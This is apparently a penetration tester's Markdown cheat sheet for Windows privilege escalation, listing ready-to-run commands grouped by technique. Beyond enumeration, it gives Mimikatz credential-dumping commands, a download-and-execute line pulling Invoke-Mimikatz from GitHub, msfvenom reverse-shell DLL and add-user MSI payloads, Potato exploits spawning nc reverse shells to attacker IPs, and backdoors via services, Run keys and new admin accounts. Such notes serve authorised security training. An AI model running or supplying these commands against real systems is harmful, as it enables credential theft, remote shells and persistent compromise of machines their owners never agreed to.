# Automated Enumeration
## PowerShell Tee
```powershell
| Tee-Object -FilePath "output.txt"
```

## PrivescCheck (Source)
```
https://github.com/itm4n/PrivescCheck
```

## Run PrivescCheck
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

## PowerUp (Source)
```
/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
```

## Run PowerUp AllChecks
```powershell
Invoke-AllChecks
```

## WinPEAS (Source)
```
/usr/share/peass/winpeas/winPEASx64.exe
```

## winPEAS Run and Copy Output to Z:\downloads\winpeas
```
.\winPEASx64.exe log
copy .\winpeas.out Z:\downloads\winpeas
```
Use parsers to convert to a better format for viewing outside of the original shell.
Run with `.\winPEASx64.exe log`; these tools can't parse the ANSI color codes in the regular output.

https://github.com/peass-ng/PEASS-ng/tree/master/parsers or better, https://github.com/mnemonic-re/parsePEASS

# Manual Context Gathering

## Show current user privileges
```cmd
whoami /all
```

## List local users
```cmd
net user
```

## Show user details
```powershell
net user administrator
```

## List local groups
```cmd
net localgroup
```

## List local groups PowerShell
```powershell
Get-LocalGroup
```

## List Administrators members
```cmd
net localgroup Administrators
```

## List Administrators members PowerShell
```powershell
Get-LocalGroupMember Administrators
```

## Show system information
```powershell
systeminfo
```

## Show network configuration
```powershell
ipconfig /all
```

## Show routing table
```powershell
route print
```

## List network connections
```powershell
netstat -ano
```

## List installed programs 32-bit
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

## List installed programs 64-bit
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

## List running processes
```powershell
Get-Process
```

## List running processes cmd
```cmd
tasklist /v
```

## List processes with command lines
```powershell
Get-WmiObject Win32_Process | Select-Object ProcessId,Name,CommandLine
wmic process get name,processid,commandline
```

# Credential Hunting

## LaZagne (Source)
```
https://github.com/AlessandroZ/LaZagne
```

## Get Environment Variables
```
Get-ChildItem -Path env:
```

## Search for files
```powershell
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe -Recurse -ErrorAction SilentlyContinue
```

## Search for database files
```powershell
Get-ChildItem -Path C:\ -Include *.db,*.sqlite,*.sql -Recurse -ErrorAction SilentlyContinue
```

## Get PowerShell history
```powershell
Get-History
```

## Get PSReadline history path
```powershell
(Get-PSReadlineOption).HistorySavePath
```

## Find PSReadline history
```powershell
Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue
```

## Check autologon registry
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

## Check VNC passwords registry
```cmd
reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v password
reg query HKLM\SOFTWARE\TightVNC\Server
```

## List saved credentials
```cmd
cmdkey /list
```

# Credential Harvesting (Requires local admin)
## Mimikatz (Kali Source)
```
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

## Mimikatz logonpasswords
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > logonpasswords.txt
```

## Mimikatz WDigest
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"
```

## Mimikatz MSV
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::msv" "exit"
```

## Mimikatz dump cached credentials
```cmd
.\mimikatz.exe "privilege::debug" "lsadump::cache" "exit"
```

## Mimikatz dump SAM
```cmd
.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

## Invoke-Mimikatz PowerShell
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

# Service Enumeration
## List services
```powershell
Get-Service
```

## List services cmd
```cmd
sc query state=all
```

## List services with paths
```powershell
Get-WmiObject win32_service | Select-Object Name,State,PathName | Where-Object {$_.State -like 'Running'}
wmic service get name,displayname,pathname,startmode
```

## Find unquoted services cmd
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

## Find unquoted services
```powershell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '*"*' -and $_.PathName -like '* *'} | Select-Object Name,PathName,StartMode
```

## PowerUp find unquoted services
```powershell
Get-UnquotedService
```

## PowerUp find modifiable services
```
. .\PowerUp.ps1
Get-ModifiableServiceFile
```

# DLL Hijacking
## Create malicious DLL
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll > evil.dll
```

# Scheduled Tasks
## List scheduled tasks
```cmd
schtasks /query /fo LIST /v
```

```powershell
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName,TaskPath
```

## Find writable task binaries
```cmd
schtasks /query /fo LIST /v | findstr /B /C:"Task To Run"
```

## Check for AlwaysInstallElevated
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Create MSI payload
```bash
msfvenom -p windows/adduser USER=hacker PASS=Password123! -f msi > evil.msi
```

## Install MSI silently
```cmd
msiexec /quiet /qn /i evil.msi
```

## Check registry autoruns
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

## Check startup folder permissions
```powershell
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```


# User Account Privileges

## SweetPotato (Source)
```
https://github.com/CCob/SweetPotato
```

## SweetPotato nc shell
```cmd
.\SweetPotato.exe -p .\nc.exe -a "192.168.45.196 4440 -e cmd.exe"
```

## RoguePotato (Source)
```
https://github.com/antonioCoco/RoguePotato
```

## RoguePotato nc shell
```
.\RoguePotato.exe -r 192.168.45.246 -e "C:\users\chris\downloads\nc.exe 192.168.45.246 4441 -e cmd.exe" -l 9999
```

## PrintSpoofer (Source)
```
https://github.com/itm4n/PrintSpoofer
```

## Run PrintSpoofer
```cmd
.\PrintSpoofer64.exe -i -c "whoami"
```

## Run JuicyPotato
```cmd
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\temp\output.txt" -t *
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user hacker Password123! /add" -t *
```

## Create local administrator
```cmd
net user Administrator2 Password123! /add
net localgroup administrators Administrator2 /add
```

## Create service backdoor
```cmd
sc create evil binpath= "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add"
sc start evil
```

## Add registry persistence
```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v evil /t REG_SZ /d "C:\temp\backdoor.exe"
```

---

# Reference

For extended reference (token impersonation tool comparison, database syntax), see [[Windows PrivEsc Reference]]

**Use [[CHECKLIST-Windows-Privesc]] to ensure you don't skip enumeration steps.**
